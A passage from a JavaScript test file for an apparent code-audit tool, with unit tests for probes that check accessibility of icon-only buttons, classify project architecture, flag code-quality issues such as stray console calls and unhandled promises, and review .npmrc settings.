    const f = probeA11yLandmarks([file('Comp.jsx', code)]);
    expect(f.find((x) => x.title.includes('Icon-only'))).toBeDefined();
  });

  it('does NOT flag icon-only React button WITH aria-label', () => {
    const code = `<button aria-label="Delete" onClick={x}><Trash size={12} /></button>`;
    const f = probeA11yLandmarks([file('Comp.jsx', code)]);
    expect(f.find((x) => x.title.includes('Icon-only'))).toBeUndefined();
  });

  it('does NOT flag button with visible text', () => {
    const code = `<button onClick={x}><Trash size={12} /> Delete</button>`;
    const f = probeA11yLandmarks([file('Comp.jsx', code)]);
    expect(f.find((x) => x.title.includes('Icon-only'))).toBeUndefined();
  });
});

describe('classifyProject + probeArchitecture', () => {
  it('classifies a plain HTML site as static-html', () => {
    const k = classifyProject([file('index.html', '<html><body>hi</body></html>')]);
    expect(k.type).toBe('static-html');
  });

  it('classifies a React SPA with one huge file as monolithic-spa', () => {
    const huge = Array.from({ length: 1600 }, (_, i) => `const x${i} = 1;`).join('\n');
    const k = classifyProject([
      file('package.json', JSON.stringify({ dependencies: { react: '18' } })),
      file('src/App.jsx', huge),
    ]);
    expect(k.type).toBe('monolithic-spa');
  });

  it('classifies a multi-file React project as modular-spa', () => {
    const tinyJsx = 'export default function X(){return null}';
    const files = [
      file('package.json', JSON.stringify({ dependencies: { react: '18' } })),
      ...Array.from({ length: 8 }, (_, i) => file(`src/c${i}.jsx`, tinyJsx)),
    ];
    const k = classifyProject(files);
    expect(k.type).toBe('modular-spa');
  });

  it('classifies a monorepo with packages/* package.json files', () => {
    const k = classifyProject([
      file('package.json', '{}'),
      file('packages/ui/package.json', JSON.stringify({ name: 'ui' })),
      file('packages/api/package.json', JSON.stringify({ name: 'api' })),
    ]);
    expect(k.type).toBe('monorepo');
  });

  it('classifies a Next.js project as ssr', () => {
    const k = classifyProject([
      file('package.json', JSON.stringify({ dependencies: { next: '14', react: '18' } })),
    ]);
    expect(k.type).toBe('ssr');
  });

  it('classifies an Express server (no UI) as backend-api', () => {
    const k = classifyProject([
      file('package.json', JSON.stringify({ dependencies: { express: '4' } })),
    ]);
    expect(k.type).toBe('backend-api');
  });

  it('classifies a CLI tool (bin field, no UI) as cli', () => {
    const k = classifyProject([file('package.json', JSON.stringify({ bin: { my: './bin.js' } }))]);
    expect(k.type).toBe('cli');
  });

  it('probeArchitecture always emits a classification info finding', () => {
    const f = probeArchitecture([file('index.html', '<html></html>')]);
    expect(f.find((x) => x.title.toLowerCase().includes('detected'))).toBeDefined();
  });

  it('probeArchitecture emits split-recommendation finding for monolithic SPA', () => {
    const huge = Array.from({ length: 1600 }, (_, i) => `const x${i} = 1;`).join('\n');
    const f = probeArchitecture([
      file('package.json', JSON.stringify({ dependencies: { react: '18' } })),
      file('src/App.jsx', huge),
    ]);
    expect(f.find((x) => x.title.toLowerCase().includes('consider splitting'))).toBeDefined();
  });
});

describe('probeCodeQuality', () => {
  it('flags console.log in production source', () => {
    const f = probeCodeQuality([file('src/foo.js', `console.log('hi'); console.warn('warn');`)]);
    expect(f.find((x) => x.title.includes('console.*'))).toBeDefined();
  });

  it('skips test files', () => {
    expect(probeCodeQuality([file('src/test/foo.test.js', `console.log('hi');`)])).toEqual([]);
    expect(probeCodeQuality([file('src/foo.spec.js', `console.log('hi');`)])).toEqual([]);
  });

  it('skips lib/logger.js (the logger module legitimately uses console)', () => {
    expect(probeCodeQuality([file('src/lib/logger.js', `console.log('hi');`)])).toEqual([]);
  });

  it('does NOT flag console inside line comments', () => {
    expect(probeCodeQuality([file('src/foo.js', `// console.log('debug')`)])).toEqual([]);
  });

  it('flags huge files (>= 5000 lines) as medium', () => {
    const huge = Array.from({ length: 5100 }, () => 'const x = 1;').join('\n');
    const f = probeCodeQuality([file('src/big.js', huge)]);
    expect(
      f.find((x) => x.severity === 'medium' && x.title.includes('extremely large'))
    ).toBeDefined();
  });

  it('flags .then() without .catch()', () => {
    const f = probeCodeQuality([file('src/foo.js', `fetch('/x').then(r => r.json())`)]);
    expect(f.find((x) => x.title.includes('.then()'))).toBeDefined();
  });

  it('does NOT flag .then().catch()', () => {
    const f = probeCodeQuality([
      file('src/foo.js', `fetch('/x').then(r => r.json()).catch(e => log(e))`),
    ]);
    expect(f.find((x) => x.title.includes('.then()'))).toBeUndefined();
  });

  it('flags async function with await but no try', () => {
    const code = `async function go(req) { const x = await fetch('/x'); return x; }`;
    const f = probeCodeQuality([file('src/foo.js', code)]);
    expect(f.find((x) => x.title.includes('no try'))).toBeDefined();
  });

  it('does NOT flag async function with try around await', () => {
    const code = `async function go(req) { try { const x = await fetch('/x'); return x; } catch (e) { return null; } }`;
    const f = probeCodeQuality([file('src/foo.js', code)]);
    expect(f.find((x) => x.title.includes('no try'))).toBeUndefined();
  });
});

describe('probeNpmrcHygiene', () => {
  it('warns when no .npmrc is present and there is a package.json', () => {
    const f = probeNpmrcHygiene([file('package.json', '{}')]);
    expect(f).toHaveLength(1);
  });

  it('does not warn when no package.json is present', () => {
    expect(probeNpmrcHygiene([file('something.txt', 'x')])).toEqual([]);
  });

  it('flags .npmrc missing min-release-age', () => {
    const f = probeNpmrcHygiene([file('package.json', '{}'), file('.npmrc', 'audit-level=high')]);
    expect(f.find((x) => x.title.includes('min-release-age'))).toBeDefined();
  });
});
